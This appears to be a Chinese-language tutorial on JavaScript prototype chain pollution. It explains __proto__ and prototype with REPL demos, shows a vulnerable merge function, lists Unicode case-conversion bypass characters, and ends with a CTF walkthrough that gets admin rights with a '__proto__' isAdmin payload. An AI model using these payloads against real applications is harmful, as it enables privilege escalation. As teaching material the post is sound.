## 原型链
在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。  
攻击者可以利用这个特性，通过修改一个对象的原型链，来污染程序的行为。例如，攻击者可以在一个对象的原型链上设置一个恶意的属性或方法，当程序在后续的执行中访问该属性或方法时，就会执行攻击者的恶意代码。
其实就是我们对原链中的某个属性进行了污染，向其中插入恶意代码，当我们再调用这个链（也就是使用这个对象）时，我们的恶意代码就会被触发，此时就达到了一个执行恶意代码的效果。
### `__proto__`和prototype
在JS中，每个对象都有一个名为`__proto__`的内置属性，他指向该对象的原型。每个函数都有一个名为`prototype`的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法，简单说`__proto__`属性是指向该对象的原型，而`prototype`属性是用于创建该对象的构造函数的原型。
例如
```js
function Person(name) {
  this.name = name;
}

Person.prototype.greet = function() {
  console.log(`Hello, my name is ${this.name}`);
};

const person1 = new Person('Alice');
person1.greet(); // 输出 "Hello, my name is Alice"
```
在浏览器输入这些执行就会输出Hello, my name is Alice
创建了名为`Person`的构造函数，并将`prototype`上的`greet`设置为一个打招呼的函数。
当创建一个名为person1的实例时，它会继承Person.prototype对象上的greet方法，所以当调用`person1.greet();`就会输出`Hello, my name is Alice`
`prototype`是类`Person`的一个属性，所有用类`Person`进行实例化的对象都会拥有`prototype`的全部内容。
我们实例化出来的`person1`对象他是不能通过`prototype`访问原型的，但通过`__proto__`就可以访问person原型。
```
console.log(person1.__proto__ === Person.prototype); // 输出 true
```
也就是说
- `prototype`是一个类的属性，所有类对象在实例化的过程都会拥有`prototype`中的属性和方法。
- 一个对象的`__proto__`属性，指向这个对象所在类的`prototype`属性。

## 具体过程
例子
```
> var a = {number : 520}
undefined
> var b = {number : 1314}
undefined
> a
{ number: 520 }
> b
{ number: 1314 }
> b.__proto__.number = 520
520
> b
{ number: 1314 }
> var c = {}
undefined
> c.number
520
>
```
在进行`b.__proto__.number = 520`操作后，即使内容是空的c，调用number属性依然是存在的，且值为我们设定的520，这就达到了一个原型链污染的目的。
### 解释
这里之所以执行过`b.__proto__.number = 520`后输出b的值依然为1314，这是因为在JS中存在这样一种继承机制，在这里调用b.number时，调用过程如下
1. 在b对象中寻找number属性。
2. 当在b对象中没有找到时就会在`b.__proto__`中寻找number属性。
3. 如果仍未找到就会去`b.__proto__.__proto__`里寻找number属性。
也就是从自身一层一层往上递归寻找，知道找到或递归到null，此机制被称为`JavaScript继承链`，我们这里的污染的属性是在`b.__proto__`中，而我们的`b`对象本身就有`number`，所以其值并未改变。
这也就解释了为什么c对象明明是空的，但`JavaScript继承链`机制会让它继续递归寻找，直到找到`c.__proto__`里的number属性，`c.__proto__`其实就是`Object.prototype`，而我们污染的`b.__proto__`也是`Object.prototype`,这也就解释了`c.number=520`
### 当存在函数的情况下
```
> function merge(target, source) {
|     for (let key in source) {
|         if (key in source && key in target) {
|             // 如果target与source有相同的键名 则让target的键值为source的键值
|             merge(target[key], source[key])
|         } else {
|             target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值
|         }
|     }
| }
undefined
> let o1 = {}
undefined
> let o2 = JSON.parse('{"a":1,"__proto__":{"b":2}}')
undefined
> merge(o1,o2)
undefined
> console.log(o1.a,o1.b)
1 2
undefined
> o3 = {}
{}
> console.log(o3.b)
2
undefined
>
```
这里看到o3为空，但是还是输出b属性为2。
这里加`JSON.parse`函数是为了，这是因为，JSON解析的情况下，`__proto__`会被认为是一个真正的`键名`，而不代表`原型`，所以在遍历o2的时候会存在这个键。当不加的时候，他就会认为他是一个原型。
JSON.parse函数作用是将**符合 JSON 格式的字符串**转换为 JavaScript 可直接操作的对象、数组或基本数据类型（数字、布尔值、null）。和 `JSON.stringify()`（把 JS 对象转成 JSON 字符串）是互逆操作。
## 拓展（js大小写转换特性）
对于`toUpperCase()`函数
```
字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
```
对于`toLowerCase`
```
字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
```

```
> console.log('ı'.toUpperCase())
I
undefined
> console.log('ſ'.toUpperCase())
S
undefined
> console.log('K'.toLowerCase())
k
undefined
> console.log('K'.toLowerCase())
k
undefined
```
## 实战
### CatCTF 2022 wife
可以注册用户，如果要注册管理员用户就需要邀请码，如果注册普通用户是拿不到flag的。
此时如果考虑到JS原型链污染的话，就变得简单了，应该是我们越权拿到管理员权限，从而获取`flag`，其注册界面源码如下所示
```python
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body)
    if (!user.username || !user.password) {
        return res.json({ msg: 'empty username or password', err: true })
    }
    if (users.filter(u => u.username == user.username).length) {
        return res.json({ msg: 'username already exists', err: true })
    }
    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
    let newUser = Object.assign({}, baseUser, user)
    users.push(newUser)
    res.json({ msg: 'user created successfully', err: false })
})
```
我们这里注意到`Object.assign`方法，他类似之前示例说的`clone`函数，`Object.assign`这个方法是可以触发原型链污染的，所以我们这里污染`__proto__.isAdmin`为 `true` 就可以了。
把抓到包里的
```
{"username":"Xin","password":"123456","isAdmin":false}
```
改为
```
{"username":"Xin","password":"123456","__proto__":{"isAdmin":true}}
```
再放包就注册成功了，再登录得到flag。
### Code-Breaking 2018 Thejs












## 参考文章
https://quan9i.top/post/%E6%B5%85%E6%9E%90CTF%E4%B8%AD%E7%9A%84Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/